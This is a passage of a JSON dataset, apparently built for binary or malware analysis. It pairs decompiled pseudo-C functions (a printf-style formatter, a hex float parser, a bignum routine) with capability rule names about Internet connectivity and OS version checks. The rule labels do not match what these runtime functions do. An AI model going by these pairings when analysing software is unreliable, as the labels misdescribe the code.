        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffc0 : 0x00443413\n\nint32_t fcn.00442d30(uint32_t param_1, uint param_2, uint param_3, char *param_4, unkbyte10 *param_5)\n\n{\n    unkbyte10 Var1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char cVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    char16_t *pcVar11;\n    unkbyte10 *pVar12;\n    float10 fVar13;\n    int32_t iStack132;\n    int32_t *piStack124;\n    ushort uStack94;\n    uint32_t uStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    ushort uStack52;\n    int32_t iStack48;\n    ushort uStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    \n    puVar4 = sub.msvcrt.dll__errno();\n    uVar2 = *puVar4;\n    iStack64 = -1;\n    iStack60 = -1;\n    uStack56 = 0xfffffffd;\n    uStack52 = 0;\n    iStack48 = 0;\n    uStack44 = 0;\n    iStack40 = 0;\n    uStack32 = 0xffffffff;\n    param_1 = param_1 & 0x6000;\n    iVar5 = *param_4;\n    uStack72 = param_2;\n    uStack68 = param_1;\n    uStack36 = param_3;\njoined_r0x00442dc4:\n    while( true ) {\n        if (iVar5 == 0) {\n            return iStack40;\n        }\n        pcVar10 = param_4 + 1;\n        if (iVar5 == 0x25) break;\n        fcn.00441540();\n        iVar5 = param_4[1];\n        param_4 = pcVar10;\n    }\n    cVar7 = param_4[1];\n    iStack60 = -1;\n    iStack64 = -1;\n    uVar9 = 0;\n    iStack132 = 0;\n    piStack124 = &iStack64;\n    param_4 = pcVar10;\n    uStack68 = param_1;\ncode_r0x00442e24:\n    iVar5 = cVar7;\n    pcVar8 = param_4;\n    if (cVar7 != '\\0') {\ncode_r0x00442e34:\n        param_4 = pcVar8 + 1;\n    // switch table (91 cases) at 0x527700\n        switch(cVar7) {\n        case ' ':\n            goto code_r0x00442eb0;\n        default:\n            if ((9 < cVar7 - 0x30U) || (3 < uVar9)) goto code_r0x004434be;\n            if (uVar9 == 0) {\n                uVar9 = 1;\n            }\n            else {\ncode_r0x0044343e:\n                if (uVar9 == 2) {\n                    uVar9 = 3;\n                }\n            }\n            if (piStack124 == NULL) goto code_r0x00442f00;\n            if (*piStack124 < 0) {\n                *piStack124 = iVar5 + -0x30;\n                goto code_r0x00442f00;\n            }\n            cVar7 = pcVar8[1];\n            *piStack124 = iVar5 + -0x30 + *piStack124 * 10;\n            goto code_r0x00442e24;\n        case '#':\n            if (uVar9 != 0) goto code_r0x00442f00;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x800;\n            goto code_r0x00442e24;\n        case '%':\n            fcn.00441540();\n            break;\n        case '\\'':\n            if (uVar9 != 0) goto code_r0x00442f00;\n            uStack68 = uStack68 | 0x1000;\n            uStack92 = 0;\n            iVar5 = sub.msvcrt.dll_localeconv();\n            iStack48 = fcn.0043ca70(&uStack94, *(iVar5 + 4), 0x10, &uStack92);\n            if (0 < iStack48) {\n                uStack44 = uStack94;\n            }\n            cVar7 = pcVar8[1];\n            goto code_r0x00442e24;\n        case '*':\n            if (piStack124 == NULL) goto code_r0x00443229;\n            if ((uVar9 & 0xfffffffd) != 0) {\n                cVar7 = pcVar8[1];\n                piStack124 = NULL;\n                uVar9 = 4;\n                goto code_r0x00442e24;\n            }\n            iVar5 = *param_5;\n            param_5 = param_5 + 4;\n            *piStack124 = iVar5;\n            if (iVar5 < 0) {\n                if (uVar9 == 0) {\n                    cVar7 = pcVar8[1];\n                    uStack68 = uStack68 | 0x400;\n                    iStack64 = -iStack64;\n                    piStack124 = NULL;\n                    goto code_r0x00442e24;\n                }\n                iStack60 = -1;\n            }\n            cVar7 = pcVar8[1];\n            piStack124 = NULL;\n            goto code_r0x00442e24;\n        case '+':\n            if (uVar9 != 0) goto code_r0x00442f00;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x100;\n            goto code_r0x00442e24;\n        case '-':\n            if (uVar9 != 0) goto code_r0x00442f00;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x400;\n            goto code_r0x00442e24;\n        case '.':\n            if (uVar9 < 2) {\n                piStack124 = &iStack60;\n                cVar7 = pcVar8[1];\n                iStack60 = 0;\n                uVar9 = 2;\n            }\n            else {\ncode_r0x00443229:\n                cVar7 = pcVar8[1];\n                uVar9 = 4;\n            }\n            goto code_r0x00442e24;\n        case '0':\n            if (uVar9 == 0) {\n                cVar7 = pcVar8[1];\n                uStack68 = uStack68 | 0x200;\n                goto code_r0x00442e24;\n            }\n            if (uVar9 < 4) goto code_r0x0044343e;\ncode_r0x004434be:\n            fcn.00441540();\n            param_4 = pcVar10;\n            break;\n        case 'A':\n            if ((uStack68 & 4) != 0) goto code_r0x00443103;\ncode_r0x0044326c:\n            fVar13 = *param_5;\n            param_5 = param_5 + 8;\n            fcn.00442730(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            break;\n        case 'C':\ncode_r0x0044328f:\n            iStack60 = -1;\n            uStack92 = uStack92 & 0xffff0000 | *param_5 & 0xffff;\n            fcn.004415a0();\n            param_5 = param_5 + 4;\n            break;\n        case 'E':\n            if ((uStack68 & 4) == 0) goto code_r0x00442f1f;\ncode_r0x00442ecc:\n            Var1 = *param_5;\n            fcn.00442180(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'F':\n            if ((uStack68 & 4) != 0) goto code_r0x00442f47;\ncode_r0x00443150:\n            fVar13 = *param_5;\n            fcn.00441cd0(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'G':\n            if ((uStack68 & 4) != 0) goto code_r0x00442f73;\ncode_r0x0044312c:\n            fVar13 = *param_5;\n            fcn.00442230(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'I':\n            cVar7 = pcVar8[1];\n            if (cVar7 == '6') {\n                if (pcVar8[2] != '4') goto code_r0x004434be;\n                param_4 = pcVar8 + 3;\n                cVar7 = pcVar8[3];\n                iStack132 = 3;\n                uVar9 = 4;\n            }\n            else if (cVar7 == '3') {\n                if (pcVar8[2] != '2') goto code_r0x00443479;\n                param_4 = pcVar8 + 3;\n                cVar7 = pcVar8[3];\n                iStack132 = 2;\n                uVar9 = 4;\n            }\n            else {\n                iStack132 = 0;\n                uVar9 = 4;\n            }\n            goto code_r0x00442e24;\n        case 'L':\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 4;\n            uVar9 = 4;\n            goto code_r0x00442e24;\n        case 'S':\ncode_r0x00443346:\n            pcVar11 = *param_5;\n            if (pcVar11 == NULL) {\n                pcVar11 = L\"(null)\";\n            }\n            if (iStack60 < 0) {\n                sub.msvcrt.dll_wcslen(pcVar11);\n            }\n            else {\n                fcn.00446d20(pcVar11, iStack60);\n            }\n            fcn.004415a0();\n            param_5 = param_5 + 4;\n            break;\n        case 'X':\n        case 'o':\n        case 'u':\n        case 'x':\n            if (iStack132 == 3) {\n                uStack92 = *param_5;\n                iStack88 = *(param_5 + 4);\n                pVar12 = param_5 + 8;\n            }\n            else {\n                pVar12 = param_5 + 4;\n                uStack92 = *param_5;\n                if (iStack132 != 2) {\n                    if (iStack132 == 1) {\n                        uStack92 = uStack92 & 0xffff;\n                        iStack88 = 0;\n                        goto code_r0x004430c8;\n                    }\n                    if (iStack132 == 5) {\n                        uStack92 = uStack92 & 0xff;\n                    }\n                }\n                iStack88 = 0;\n            }\ncode_r0x004430c8:\n            if (iVar5 == 0x75) goto code_r0x004431f3;\n            fcn.004423c0(&uStack72);\n            param_5 = pVar12;\n            break;\n        case 'a':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x0044326c;\ncode_r0x00443103:\n            Var1 = *param_5;\n            param_5 = param_5 + 0xc;\n            fcn.00442730(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            break;\n        case 'c':\n            iStack60 = -1;\n            if (iStack132 - 2U < 2) goto code_r0x0044328f;\n            uStack92 = uStack92 & 0xffffff00 | *param_5 & 0xff;\n            fcn.004416c0();\n            param_5 = param_5 + 4;\n            break;\n        case 'd':\n        case 'i':\n            uStack68 = uStack68 | 0x80;\n            if (iStack132 == 3) {\n                uStack92 = *param_5;\n                iStack88 = *(param_5 + 4);\n                pVar12 = param_5 + 8;\n            }\n            else {\n                pVar12 = param_5 + 4;\n                uStack92 = *param_5;\n                if (iStack132 != 2) {\n                    if (iStack132 == 1) {\n                        uStack92 = uStack92;\n                        iStack88 = uStack92 >> 0x1f;\n                        goto code_r0x004431df;\n                    }\n                    if (iStack132 == 5) {\n                        uStack92 = uStack92;\n                    }\n                }\n                iStack88 = uStack92 >> 0x1f;\n            }\ncode_r0x004431df:\n            iStack84 = iStack88 >> 0x1f;\n            iStack80 = iStack84;\ncode_r0x004431f3:\n            fcn.00441da0();\n            param_5 = pVar12;\n            break;\n        case 'e':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 != 0) goto code_r0x00442ecc;\ncode_r0x00442f1f:\n            fVar13 = *param_5;\n            fcn.00442180(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'f':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x00443150;\ncode_r0x00442f47:\n            Var1 = *param_5;\n            fcn.00441cd0(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'g':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x0044312c;\ncode_r0x00442f73:\n            Var1 = *param_5;\n            fcn.00442230(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'h':\n            cVar7 = pcVar8[1];\n            iStack132 = 1;\n            uVar9 = 4;\n            if (cVar7 != 'h') goto code_r0x00442e61;\n            param_4 = pcVar8 + 2;\n            cVar7 = pcVar8[2];\n            iStack132 = 5;\n            goto code_r0x00442e24;\n        case 'j':\n            cVar7 = pcVar8[1];\n            iStack132 = 3;\n            uVar9 = 4;\n            goto code_r0x00442e24;\n        case 'l':\n            cVar7 = pcVar8[1];\n            iStack132 = 2;\n            uVar9 = 4;\n            if (cVar7 != 'l') goto code_r0x00442e61;\n            param_4 = pcVar8 + 2;\n            cVar7 = pcVar8[2];\n            iStack132 = 3;\n            goto code_r0x00442e24;\n        case 'm':\n            sub.msvcrt.dll_strerror(uVar2);\n            fcn.00441780();\n            break;\n        case 'n':\n            piVar3 = *param_5;\n            param_5 = param_5 + 4;\n            if (iStack132 == 5) {\n                *piVar3 = iStack40;\n            }\n            else if (iStack132 == 1) {\n                *piVar3 = iStack40;\n            }\n            else if (iStack132 == 2) {\n                *piVar3 = iStack40;\n            }\n            else {\n                *piVar3 = iStack40;\n                if (iStack132 == 3) {\n                    piVar3[1] = iStack40 >> 0x1f;\n                }\n            }\n            break;\n        case 'p':\n            if ((uVar9 == 0) && (uStack68 == param_1)) {\n                uStack68 = param_1 | 0x200;\n                iStack60 = 8;\n            }\n            uStack92 = *param_5;\n            iStack88 = 0;\n            iStack84 = 0;\n            iStack80 = 0;\n            fcn.004423c0(&uStack72);\n            param_5 = param_5 + 4;\n            break;\n        case 's':\n            if (iStack132 - 2U < 2) goto code_r0x00443346;\n            fcn.00441780();\n            param_5 = param_5 + 4;\n            break;\n        case 't':\n        case 'z':\n            cVar7 = pcVar8[1];\n            iStack132 = 0;\ncode_r0x00442e61:\n            uVar9 = 4;\n            goto code_r0x00442e24;\n        }\n        iVar5 = *param_4;\n    }\n    goto joined_r0x00442dc4;\ncode_r0x00443479:\n    uVar9 = 4;\n    iStack132 = 0;\n    iVar5 = 0x33;\n    pcVar8 = param_4;\n    goto code_r0x00442e34;\ncode_r0x00442eb0:\n    if (uVar9 == 0) {\n        cVar7 = pcVar8[1];\n        uStack68 = uStack68 | 0x40;\n    }\n    else {\ncode_r0x00442f00:\n        cVar7 = pcVar8[1];\n    }\n    goto code_r0x00442e24;\n}\n",
        "token_count": 4313
    },
    "00444ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t fcn.00444ea0(uint8_t **param_1, uint32_t *param_2, uint32_t *param_3, int32_t *param_4, uint32_t param_5)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    uint8_t **ppuVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    uint8_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint8_t uVar14;\n    uint8_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    uint8_t uVar19;\n    uint32_t *puVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    bool bVar23;\n    uint8_t *puStack56;\n    uint8_t *puStack52;\n    uint32_t uStack44;\n    int32_t iStack40;\n    uint32_t *puStack36;\n    int32_t iStack32;\n    \n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    puVar3 = *ppuVar5;\n    if (*0x56be30 == '\\0') {\n        fcn.00445a10();\n    }\n    *param_4 = 0;\n    puStack52 = *param_1;\n    uVar14 = puStack52[2];\n    if (uVar14 == 0x30) {\n        iVar12 = 0;\n        puVar7 = puStack52 + 3;\n        do {\n            puStack52 = puVar7;\n            uVar14 = *puStack52;\n            iVar12 = iVar12 + 1;\n            puVar7 = puStack52 + 1;\n        } while (uVar14 == 0x30);\n    }\n    else {\n        puStack52 = puStack52 + 2;\n        iVar12 = 0;\n    }\n    puStack56 = puStack52;\n    uVar11 = *puVar3;\n    if (*(uVar14 + 0x56be00) == '\\0') {\n        puVar7 = puStack52;\n        if ((uVar11 != 0) && (puVar6 = puStack52,  puVar15 = puVar3,  uVar14 == uVar11)) {\ncode_r0x00444f41:\n            puVar6 = puVar6 + 1;\n            uVar1 = puVar15[1];\n            uVar19 = *puVar6;\n            if (uVar1 != 0) goto code_r0x00444f33;\n            cVar2 = *(uVar19 + 0x56be00);\n            puVar7 = puVar6;\n            uVar14 = uVar19;\n            if (cVar2 != '\\0') {\n                puVar15 = puVar6;\n                if (uVar19 == 0x30) {\n                    do {\n                        puVar15 = puVar15 + 1;\n                        uVar19 = *puVar15;\n                    } while (uVar19 == 0x30);\n                    cVar2 = *(uVar19 + 0x56be00);\n                }\n                bVar23 = cVar2 == '\\0';\n                puStack56 = puVar15;\n                if (!bVar23) {\n                    iVar12 = 1;\n                    goto code_r0x004450e2;\n                }\n                iVar12 = 1;\n                if (uVar11 != uVar19) goto code_r0x00444fb0;\n                goto code_r0x0044510c;\n            }\n        }\ncode_r0x0044512a:\n        puVar15 = puVar7;\n        if ((uVar14 == 0x50) || (uVar14 == 0x70)) {\n            uStack44 = 0;\n            bVar23 = true;\n            goto code_r0x00445152;\n        }\n        bVar23 = true;\n        uStack44 = 0;\n        puStack52 = NULL;\n        bVar4 = false;\ncode_r0x00445308:\n        if (iVar12 == 0) {\n            puVar7 = puStack56 + -1;\n        }\n        *param_1 = puVar7;\n        if (bVar23) {\n            return 0;\n        }\n        if (bVar4) {\n            uVar8 = param_2[3];\n            if (puStack52 != NULL) {\n                if (uVar8 == 2) {\n                    if (param_5 != 0) goto code_r0x004452ca;\n                }\n                else if ((uVar8 != 3) || (param_5 == 0)) goto code_r0x004452ca;\n                iStack40 = fcn.00445f30(0);\n                *(iStack40 + 0x10) = 1;\n                *(iStack40 + 0x14) = 1;\n                uVar8 = param_2[1];\n                goto code_r0x00445384;\n            }\n            if (uVar8 == 2) {\n                if (param_5 != 0) goto code_r0x0044547b;\n            }\n            else if (uVar8 == 3) {\n                if (param_5 == 0) goto code_r0x0044547b;\n            }\n            else if (uVar8 != 1) {\ncode_r0x0044547b:\n                uVar8 = *param_2 & 0x1f;\n                iVar18 = *param_2 >> 5;\n                iVar21 = (iVar18 + 1) - (uVar8 == 0);\n                iVar12 = 0;\n                iVar13 = iVar21;\n                while (iVar13 = iVar13 >> 1,  iVar13 != 0) {\n                    iVar12 = iVar12 + 1;\n                }\n                iVar12 = fcn.00445f30(iVar12);\n                *param_4 = iVar12;\n                *(iVar12 + 0x10) = iVar21;\n                if (0 < iVar18) {\n                    puVar9 = iVar12 + 0x14;\n                    do {\n                        *puVar9 = 0xffffffff;\n                        puVar9 = puVar9 + 1;\n                        puStack52 = iVar18;\n                    } while (puVar9 != iVar12 + 0x14 + iVar18 * 4);\n                }\n                if (iVar18 < iVar21) {\n                    *(iVar12 + 0x14 + puStack52 * 4) = 0x20 >> (0x20U - uVar8 & 0x1f);\n                }\n                *param_3 = param_2[1];\n                return 0x11;\n            }\n            goto code_r0x0044550e;\n        }\n    }\n    else {\n        iVar12 = iVar12 + 1;\n        bVar23 = false;\n        puVar6 = NULL;\n        puVar15 = puStack52;\ncode_r0x004450e2:\n        do {\n            puVar7 = puVar15;\n            puVar15 = puVar7 + 1;\n        } while (*(puVar7[1] + 0x56be00) != '\\0');\n        if (puVar7[1] == uVar11) {\n            if (puVar6 == NULL) {\n                if (puVar3[1] != 0) {\n                    if (puVar7[2] == puVar3[1]) {\n                        puVar6 = puVar7 + 3;\n                        puVar7 = puVar3 + 2;\n                        do {\n                            uVar14 = *puVar7;\n                            uVar11 = *puVar6;\n                            if (uVar14 == 0) goto code_r0x004455ca;\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (uVar14 == uVar11);\n                        uVar11 = *puVar15;\n                        uStack44 = 0;\n                    }\n                    else {\n                        uStack44 = 0;\n                    }\n                    goto code_r0x00444fc8;\n                }\n                uVar11 = puVar7[2];\n                puVar6 = puVar7 + 2;\ncode_r0x004455ca:\n                cVar2 = *(uVar11 + 0x56be00);\n                puVar15 = puVar6;\n                while (cVar2 != '\\0') {\n                    puVar15 = puVar15 + 1;\n                    uVar11 = *puVar15;\n                    cVar2 = *(uVar11 + 0x56be00);\n                }\n            }\n            else {\ncode_r0x0044510c:\n                uVar11 = *puVar15;\n            }\ncode_r0x00444fbf:\n            uStack44 = (puVar6 - puVar15) * 4;\n        }\n        else {\ncode_r0x00444fb0:\n            uVar11 = *puVar15;\n            uStack44 = 0;\n            if (puVar6 != NULL) goto code_r0x00444fbf;\n        }\ncode_r0x00444fc8:\n        if ((uVar11 == 0x50) || (uVar11 == 0x70)) {\ncode_r0x00445152:\n            uVar14 = puVar15[1];\n            if (uVar14 == 0x2b) {\n                puStack52 = NULL;\ncode_r0x004453b8:\n                puVar6 = puVar15 + 2;\n                uVar14 = puVar15[2];\n            }\n            else {\n                if (uVar14 == 0x2d) {\n                    puStack52 = 0x1;\n                    goto code_r0x004453b8;\n                }\n                puVar6 = puVar15 + 1;\n                puStack52 = NULL;\n            }\n            bVar4 = false;\n            puVar7 = puVar15;\n            if (*(uVar14 + 0x56be00) - 1 < 0x19) {\n                uVar8 = *(uVar14 + 0x56be00) - 0x10;\n                puVar7 = puVar6 + 1;\n                uVar14 = *(puVar6[1] + 0x56be00);\n                while (uVar14 - 1 < 0x19) {\n                    if ((uVar8 & 0xf8000000) != 0) {\n                        bVar4 = true;\n                    }\n                    puVar7 = puVar7 + 1;\n                    uVar8 = (uVar14 - 0x10) + uVar8 * 10;\n                    uVar14 = *(*puVar7 + 0x56be00);\n                }\n                uVar22 = -uVar8;\n                if (puStack52 == NULL) {\n                    uVar22 = uVar8;\n                }\n                uStack44 = uStack44 + uVar22;\n            }\n            goto code_r0x00445308;\n        }\n        *param_1 = puVar15;\n        if (bVar23) {\n            return 0;\n        }\n    }\n    iVar12 = 0;\n    for (puVar7 = puVar15 + (-1 - puStack56); 7 < puVar7; puVar7 = puVar7 >> 1) {\n        iVar12 = iVar12 + 1;\n    }\n    iStack40 = fcn.00445f30(iVar12);\n    puStack36 = iStack40 + 0x14;\n    if (puVar3[1] == 0) {\n        iStack32 = 0;\n    }\n    else {\n        iVar12 = 0;\n        do {\n            iStack32 = iVar12 + 1;\n            iVar13 = iVar12 + 2;\n            iVar12 = iStack32;\n        } while (puVar3[iVar13] != 0);\n    }\n    puVar20 = puStack36;\n    if (puStack56 < puVar15) {\n        puStack52 = NULL;\n        iVar12 = 0;\n        do {\n            while( true ) {\n                uVar8 = puStack52;\n                uVar14 = puVar15[-1];\n                puVar7 = puVar15 + -1;\n                puVar10 = puVar20 + 1;\n                if (uVar14 == puVar3[iStack32]) break;\n                if (iVar12 == 0x20) {\n                    puStack52 = NULL;\n                    *puVar20 = uVar8;\n                    uVar14 = puVar15[-1];\n                    iVar12 = 0;\n                    iVar13 = 4;\n                    puVar16 = puVar20 + 2;\n                    puVar20 = puVar10;\n                }\n                else {\n                    iVar13 = iVar12 + 4;\n                    puVar16 = puVar10;\n                }\n                puStack52 = puStack52 | (*(uVar14 + 0x56be00) & 0xf) << (iVar12 & 0x1f);\n                puVar15 = puVar7;\n                iVar12 = iVar13;\n                puVar10 = puVar16;\n                if (puVar7 <= puStack56) goto code_r0x00445230;\n            }\n            puVar15 = puVar7 + -iStack32;\n        } while (puStack56 < puVar15);\ncode_r0x00445230:\n        uVar8 = 0x1f;\n        if (puStack52 != NULL) {\n            for (; puStack52 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n            }\n        }\n        uVar8 = uVar8 ^ 0x1f;\n    }\n    else {\n        puStack52 = NULL;\n        puVar10 = iStack40 + 0x18;\n        uVar8 = 0x20;\n    }\n    *puVar20 = puStack52;\n    iVar12 = puVar10 - puStack36 >> 2;\n    *(iStack40 + 0x10) = iVar12;\n    iVar12 = iVar12 * 0x20 - uVar8;\n    uVar22 = *param_2;\n    if (uVar22 < iVar12) {\n        iVar12 = iVar12 - uVar22;\n        uVar17 = fcn.00446c50(iStack40, iVar12);\n        if (uVar17 != 0) {\n            iVar13 = iVar12 + -1;\n            uVar17 = 1;\n            if ((puStack36[iVar13 >> 5] & 1 << (iVar13 & 0x1f)) != 0) {\n                if ((iVar13 == 0) || (iVar13 = fcn.00446c50(iStack40, iVar13),  iVar13 == 0)) {\n                    uVar17 = 2;\n                }\n                else {\n                    uVar17 = 3;\n                }\n            }\n        }\n        fcn.004458b0(iStack40, iVar12);\n        uStack44 = uStack44 + iVar12;\n    }\n    else {\n        uVar17 = 0;\n        if (iVar12 < uVar22) {\n            iStack40 = fcn.00446480(iStack40, uVar22 - iVar12);\n            puStack36 = iStack40 + 0x14;\n            uStack44 = uStack44 - (uVar22 - iVar12);\n        }\n    }\n    if (param_2[2] < uStack44) {\ncode_r0x00445502:\n        fcn.00446000(iStack40);\ncode_r0x0044550e:\n        puVar9 = sub.msvcrt.dll__errno();\n        *puVar9 = 0x22;\n        return 0xa3;\n    }\n    uVar8 = param_2[1];\n    if (uStack44 < uVar8) {\n        uStack44 = uVar8 - uStack44;\n        if (uVar22 <= uStack44) {\n            uVar17 = param_2[3];\n            if (uVar17 == 2) {\n                if (param_5 == 0) goto code_r0x00445732;\n            }\n            else if (uVar17 == 3) {\n                if (param_5 != 0) goto code_r0x00445732;\n            }\n            else if ((uVar17 == 1) && (uVar22 == uStack44)) {\n                if (1 < uVar22) {\n                    iVar12 = fcn.00446c50(iStack40, uVar22 - 1);\n                    if (iVar12 == 0) goto code_r0x004452be;\n                    uVar8 = param_2[1];\n                }\ncode_r0x00445732:\n                *(iStack40 + 0x10) = 1;\n                *puStack36 = 1;\ncode_r0x00445384:\n                *param_4 = iStack40;\n                *param_3 = uVar8;\n                puVar9 = sub.msvcrt.dll__errno();\n                *puVar9 = 0x22;\n                return 0x62;\n            }\ncode_r0x004452be:\n            fcn.00446000(iStack40);\ncode_r0x004452ca:\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n            return 0x50;\n        }\n        iVar12 = uStack44 - 1;\n        if (uVar17 == 0) {\n            if (iVar12 != 0) {\n                uVar17 = fcn.00446c50(iStack40, iVar12);\n            }\n        }\n        else {\n            uVar17 = 1;\n        }\n        if ((puStack36[iVar12 >> 5] & 1 << (iVar12 & 0x1f)) != 0) {\n            uVar17 = uVar17 | 2;\n        }\n        uVar22 = uVar22 - uStack44;\n        uVar14 = 2;\n        fcn.004458b0(iStack40, uStack44);\n        uStack44 = param_2[1];\n    }\n    else {\n        uVar14 = 1;\n    }\n    if (uVar17 == 0) goto code_r0x0044555e;\n    uVar8 = param_2[3];\n    if (uVar8 == 2) {\n        param_5 = 1 - param_5;\njoined_r0x004456ac:\n        if (param_5 != 0) {\n            iVar12 = *(iStack40 + 0x10);\n            iStack40 = fcn.0043dfb0(iStack40);\n            if (uVar14 == 2) {\n                uVar14 = 0x22;\n                if (*param_2 - 1 == uVar22) {\n                    uVar14 = ((*(iStack40 + 0x14 + (uVar22 >> 5) * 4) & 1 << (uVar22 & 0x1f)) == 0) + 0x21;\n                }\n                goto code_r0x0044555e;\n            }\n            if (*(iStack40 + 0x10) == iVar12 || *(iStack40 + 0x10) < iVar12) {\n                if ((uVar22 & 0x1f) != 0) {\n                    puVar20 = iStack40 + 0x10 + iVar12 * 4;\n                    uVar8 = 0x1f;\n                    if (*puVar20 != 0) {\n                        for (; *puVar20 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n                        }\n                    }\n                    if ((uVar8 ^ 0x1f) < 0x20 - (uVar22 & 0x1f)) goto code_r0x004456f2;\n                }\n            }\n            else {\ncode_r0x004456f2:\n                fcn.004458b0(iStack40, 1);\n                uStack44 = uStack44 + 1;\n                if (param_2[2] < uStack44) goto code_r0x00445502;\n            }\n            uVar14 = 0x21;\n            goto code_r0x0044555e;\n        }\n    }\n    else {\n        if (uVar8 == 3) goto joined_r0x004456ac;\n        if ((uVar8 == 1) && ((uVar17 & 2) != 0)) {\n            param_5 = (uVar17 | *puStack36) & 1;\n            goto joined_r0x004456ac;\n        }\n    }\n    uVar14 = uVar14 | 0x10;\ncode_r0x0044555e:\n    *param_4 = iStack40;\n    *param_3 = uStack44;\n    return uVar14;\ncode_r0x00444f33:\n    puVar15 = puVar15 + 1;\n    if (uVar1 != uVar19) goto code_r0x0044512a;\n    goto code_r0x00444f41;\n}\n",
        "token_count": 4691
    },
    "00446a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446a00(int32_t param_1, int32_t param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    \n    iVar4 = (param_3 + 8) / 9;\n    if (iVar4 < 2) {\n        iVar5 = 0;\n    }\n    else {\n        iVar5 = 0;\n        iVar3 = 1;\n        do {\n            iVar1 = iVar3 * 2;\n            iVar5 = iVar5 + 1;\n            iVar2 = iVar3 * -2;\n            iVar3 = iVar1;\n        } while (iVar4 != iVar1 && SBORROW4(iVar4, iVar1) == iVar4 + iVar2 < 0);\n    }\n    iVar4 = fcn.00445f30(iVar5);\n    *(iVar4 + 0x10) = 1;\n    *(iVar4 + 0x14) = param_4;\n    if (param_2 < 10) {\n        pcVar6 = param_1 + 9 + param_5;\n        param_2 = 9;\n    }\n    else {\n        pcVar6 = param_1 + 9;\n        do {\n            pcVar8 = pcVar6 + 1;\n            iVar4 = fcn.00446070(iVar4, 10, *pcVar6 + -0x30);\n            pcVar6 = pcVar8;\n        } while (pcVar8 != param_2 + param_1);\n        pcVar6 = param_5 + param_2 + param_1;\n    }\n    if (param_2 < param_3) {\n        pcVar8 = pcVar6;\n        do {\n            pcVar7 = pcVar8 + 1;\n            iVar4 = fcn.00446070(iVar4, 10, *pcVar8 + -0x30);\n            pcVar8 = pcVar7;\n        } while (pcVar6 + (param_3 - param_2) != pcVar7);\n    }\n    return;\n}\n",
        "token_count": 507
    },
    "00446ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
